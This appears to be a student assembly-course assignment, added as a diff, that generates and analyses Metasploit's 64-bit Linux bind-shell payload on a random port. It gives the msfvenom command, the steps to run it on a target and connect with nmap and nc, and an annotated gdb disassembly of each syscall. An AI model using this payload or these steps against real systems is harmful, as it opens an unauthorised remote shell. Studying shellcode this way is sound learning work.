@@ -1,0 +1,101 @@
+Assignment#5
+
+Author : SLAE64-PA-6470 (kahlon81)
+
+Analysis of linux/x64/shell_bind_tcp_random_port
+
+>>> Generate shellcode
+
+msfvenom -a x64 --platform linux -p linux/x64/shell_bind_tcp_random_port -f elf > shell_bind_tcp_random_port
+
+No encoder or badchars specified, outputting raw payload
+Payload size: 57 bytes
+Final size of elf file: 177 bytes
+
+Usage :
+
+Target :
+chmod +x shell_bind_tcp_random_port 
+./shell_bind_tcp_random_port 
+
+Pentester :
+
+Search port :
+nmap -sS <Target> -p-
+
+Connect to target :
+nc <Target IP> <Port>
+
+>>> Debug with gdb
+
+gdb ./shell_bind_tcp_random_port
+break *0x400078
+set disassembly-flavor intel
+run
+layout asm
+layout regs
+
+Analysis :
+
+1) Open a socket stream
+
+B+>│0x400078        xor    rsi,rsi                                                                                                                  
+   │0x40007b        mul    rsi                                                                                                                      
+   │0x40007e        inc    esi                                                                                                                      
+   │0x400080        push   0x2                                                                                                                      
+   │0x400082        pop    rdi                                                                                                                      
+   │0x400083        mov    al,0x29                                                                                                                  
+   │0x400085        syscall 
+
+sys_socket (rax = 41) int family (rdi = 0x02)  int type (rsi = 0x01)  int protocol (rdx = 0x00)
+
+
+2) Socket listen
+
+   │0x400087        push   rdx                                                                                                                      
+   │0x400088        pop    rsi                                                                                                                      
+   │0x400089        push   rax                                                                                                                      
+   │0x40008a        pop    rdi                                                                                                                      
+   │0x40008b        mov    al,0x32                                                                                                                  
+   │0x40008d        syscall 
+
+syscall sys_listen (rax = 50)  int fd  int backlog
+
+Socket listen on random port
+
+3) Accept connection
+
+   │0x40008f        mov    al,0x2b                                                                                                                  
+   │0x400091        syscall
+
+sys_accept (rax = 43) int fd  struct sockaddr *upeer_sockaddr int *upeer_addrlen
+
+Process is waiting connexion
+
+4) Duplicate socket (stdin, stout, stderr)
+
+   │0x400093        push   rdi                                                                                                                      
+   │0x400094        pop    rsi                                                                                                                      
+   │0x400095        xchg   rdi,rax                                                                                                                  
+   │0x400097        dec    esi                                                                                                                      
+   │0x400099        mov    al,0x21                                                                                                                  
+   │0x40009b        syscall
+
+sys_dup2 (rax = 33) unsigned int oldfd  unsigned int newfd  
+
+
+5) Shellcode
+
+Call to sys_execve (rax = 59) const char *filename  const char *const argv[]  const char *
+
+Execute /bin/sh which is hs/nib/ in little endian or 0x68732f6e69622f in hexa
+
+   │0x40009d        jne    0x400097                                                                                                                 
+   │0x40009f        push   rdx                                                                                                                      
+   │0x4000a0        movabs rdi,0x68732f6e69622f2f                                                                                                   
+   │0x4000aa        push   rdi                                                                                                                      
+   │0x4000ab        push   rsp                                                                                                                      
+   │0x4000ac        pop    rdi                                                                                                                     
+   │0x4000ad        mov    al,0x3b                                                                                                                  
+   │0x4000af        syscall 
+
